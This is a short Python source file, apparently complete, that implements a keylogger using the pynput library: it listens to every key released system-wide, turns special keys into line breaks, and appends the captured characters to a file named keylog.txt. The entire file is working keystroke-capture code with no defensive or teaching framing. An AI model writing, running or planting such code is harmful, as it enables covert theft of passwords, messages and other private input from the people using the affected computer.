import time
from pynput.keyboard import Listener, Key

text = ""
last_input_time = time.time()

def process_input(input_text):
    global text
    if input_text in ["ENTER", "BACKSPACE", "ESC", "SPACE", "TAB", "SHIFT", "ALT", "CTRL", "CAPS LOCK", "DELETE", "HOME", "END", "UP ARROW", "DOWN ARROW", "LEFT ARROW", "RIGHT ARROW"]:
        text = "\n"
    else:
        text = input_text
    with open("keylog.txt", "a") as file:
        file.write(text)


def on_key_release(key):
    global last_input_time
    current_time = time.time()
    time_since_last_input = current_time - last_input_time
    
    if time_since_last_input >= 5:
        process_input("\n")
    
    last_input_time = current_time
    
    try:
        if key == Key.enter:
            input_text = "ENTER"
        elif key == Key.backspace:
            input_text = "BACKSPACE"
        elif key == Key.esc:
            input_text = "ESC"
        elif key == Key.tab:
            input_text = "TAB"
        elif key == Key.shift:
            input_text = "SHIFT"
        elif key == Key.alt:
            input_text = "ALT"
        elif key == Key.ctrl:
            input_text = "CTRL"
        elif key == Key.caps_lock:
            input_text = "CAPS LOCK"
        elif key == Key.delete:
            input_text = "DELETE"
        elif key == Key.home:
            input_text = "HOME"
        elif key == Key.end:
            input_text = "END"
        elif key == Key.up:
            input_text = "UP ARROW"
        elif key == Key.down:
            input_text = "DOWN ARROW"
        elif key == Key.left:
            input_text = "LEFT ARROW"
        elif key == Key.right:
            input_text = "RIGHT ARROW"
        else:
            input_text = key.char
        process_input(input_text)
    except AttributeError:
        pass

def start_keylogger():
    with Listener(on_release=on_key_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
